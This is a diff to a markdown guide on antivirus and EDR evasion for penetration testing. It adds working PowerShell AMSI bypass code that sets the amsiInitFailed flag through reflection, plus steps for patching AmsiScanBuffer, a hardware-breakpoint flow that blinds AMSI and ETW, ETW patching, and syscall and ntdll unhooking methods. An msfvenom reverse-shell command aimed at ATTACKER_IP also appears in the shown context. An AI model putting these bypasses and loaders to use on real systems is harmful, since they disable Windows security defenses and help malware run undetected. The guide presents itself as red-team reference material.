@@ -1,17 +1,31 @@
-# Antivirus Evasion Techniques
+# Antivirus & EDR Evasion Techniques
 
-Comprehensive guide to AV bypass, AMSI bypass, obfuscation, shellcode encoding, and evasion tools for penetration testing engagements.
+Comprehensive guide to AV/EDR bypass, AMSI/ETW bypass, obfuscation, shellcode loaders, sleep obfuscation, and evasion tooling for **authorized** penetration testing and red-team engagements. Test only in isolated labs with sample-submission disabled, and document techniques + telemetry for the report.
+
+> **AV vs EDR — they are different problems.** Static AV (signatures/ML on the file) is beaten by obfuscation/encryption/loaders. **EDR** instruments the *runtime*: userland API hooks, AMSI, ETW, kernel callbacks (process/thread/image-load), and ETW-TI from the kernel. Beating AV ≠ beating EDR. Most of the "advanced" content below targets EDR. See also `shellcode-loaders.md` (companion file) for loader construction.
 
 ---
 
-## AV Detection Methods
+## Threat Model: What Modern Defenses Actually Do
+
+| Layer | Mechanism | Beaten by |
+|-------|-----------|-----------|
+| Static AV | Hash/byte signatures, ML on PE features | Encryption, packing, custom loader, unique builds |
+| AMSI | In-proc scan of scripts/.NET before exec | AMSI patch (memory or patchless/HWBP), avoid amsi'd hosts |
+| ETW (userland) | Telemetry events (e.g. .NET, threat-intel) | ETW patch, indirect/`Nt*` calls, patchless HWBP |
+| Userland hooks | EDR DLL hooks `ntdll`/`kernel32` | Direct/indirect syscalls, unhooking, hardware breakpoints |
+| Kernel callbacks | Process/thread/image notify routines | Hard from userland; BYOVD (loud, risky), behavior shaping |
+| Memory scanning | Periodic RWX/beacon scans | Sleep obfuscation (Ekko/Foliage), RW->RX flips, module stomping |
+| Behavioral / ML | Process tree, API sequences, network | Sane parent procs, LOLBins, low volume, jittered C2 |
+
+### AV Detection Methods (static layer)
 
 | Method | Description | Bypass Difficulty |
 |--------|-------------|-------------------|
 | Signature-based | Hash/pattern matching | Easy |
 | Heuristic-based | Rule/algorithm analysis | Medium |
 | Behavioral | Runtime behavior analysis | Hard |
-| Machine Learning | Cloud-based AI detection | Very Hard |
+| Machine Learning | Cloud/local AI detection | Very Hard |
 
 ### AV Engine Components
 - **File Engine**: Scheduled/real-time file scans
@@ -136,15 +150,65 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f ps1
 
 ### AMSI Bypass Techniques
 
-```powershell
-# Method 1: Memory patching (amsiContext nullification)
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+AMSI (Antimalware Scan Interface) lets AV scan script/.NET content *after* deobfuscation, in-process. To run in-memory payloads on modern Windows you typically neutralize it first. Note: the well-known static one-liners below are **signatured by AMSI itself** — you must obfuscate them (string-split, char-codes, env-var assembly) or use a patchless approach.
 
-# Method 2: Set amsiInitFailed to true
+```powershell
+# Method 1: amsiInitFailed flag (must be obfuscated; raw form is detected)
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
 $field.SetValue($null,$true)
+
+# Method 2: Patch AmsiScanBuffer in memory (overwrite prologue to return clean)
+#   - Resolve amsi.dll!AmsiScanBuffer, VirtualProtect RWX, write a stub that
+#     returns AMSI_RESULT_CLEAN (or E_INVALIDARG). Classic but EDR watches the
+#     write to amsi.dll. Build the bytes/offsets dynamically; don't hardcode.
+
+# Method 3: Force a benign AMSI provider / break amsiContext (reflection on amsiSession)
+```
+
+**Patchless AMSI/ETW bypass via hardware breakpoints (current, OPSEC-safer 2025):**
+Instead of patching `amsi.dll`/`ntdll` (which triggers memory-integrity and write-to-system-DLL detections), set a **debug-register hardware breakpoint** on `AmsiScanBuffer` (and `NtTraceControl` for ETW) via a vectored exception handler. When hit, the handler rewrites the return value/registers and resumes with `NtContinue`. No bytes in any module are modified, so signature/integrity checks see clean DLLs.
+
+```text
+Flow (implement in C / C# / Nim, not raw PowerShell):
+1. AddVectoredExceptionHandler(1, &Handler)
+2. Resolve AmsiScanBuffer (AMSI) and NtTraceControl (ETW) addresses
+3. Set Dr0/Dr7 in the thread context (a hardware breakpoint, not a code patch)
+   - use NtContinue to commit the modified context, NOT SetThreadContext,
+     to avoid the ETW-TI NtSetThreadContext event
+4. Handler fires on EXCEPTION_SINGLE_STEP at the target:
+   - set RAX = AMSI_RESULT_CLEAN (or skip the call), advance RIP, resume
+5. Bypass holds for the calling thread; few EDRs detect HWBP-based bypass today
+```
+
+Caveats: it's **per-thread** (set on each thread that runs scanned content), and **userland-only** — kernel-mode ETW-TI is unaffected. Public PoCs: rasta-mouse / various "PatchlessAMSI"/"PatchlessEtwAndAmsiBypass" repos.
+
+### ETW Bypass (telemetry blinding)
+
+ETW (esp. the .NET CLR provider and Microsoft-Windows-Threat-Intelligence) feeds EDR. Blind it before loading .NET assemblies in-memory:
+
+```
+- Patch ntdll!EtwEventWrite / NtTraceEvent to return immediately (classic patch).
+- Patchless: HWBP on NtTraceControl (see above) — no module modification.
+- Set the COMPlus_ETWEnabled=0 env var before spawning a .NET host (CLR-level).
+- Use indirect syscalls so EDR's ntdll hooks (which also feed ETW) are skipped.
+```
+
+### Syscalls & Unhooking (defeat userland hooks)
+
+EDRs hook `ntdll`/`kernel32` exports to inspect calls. Bypass the hooks:
+
+```text
+- Direct syscalls: invoke the syscall instruction yourself with the right SSN
+  (syscall service number). Tooling: SysWhispers2/3, Hell's Gate, Halo's Gate,
+  FreshyCalls. Problem: a syscall instruction NOT inside ntdll is itself an IOC
+  to call-stack/instrumentation-callback detections.
+- Indirect syscalls: load the SSN but jmp to the real `syscall;ret` gadget
+  inside ntdll so the return address looks legitimate (used by Havoc's
+  OBF_SYSCALL). Current best-balance technique.
+- Unhooking: re-map a clean copy of ntdll (from disk/KnownDlls/suspended proc)
+  over the hooked one to remove EDR hooks before you call.
 ```
 
 ### Execution Policy Bypasses
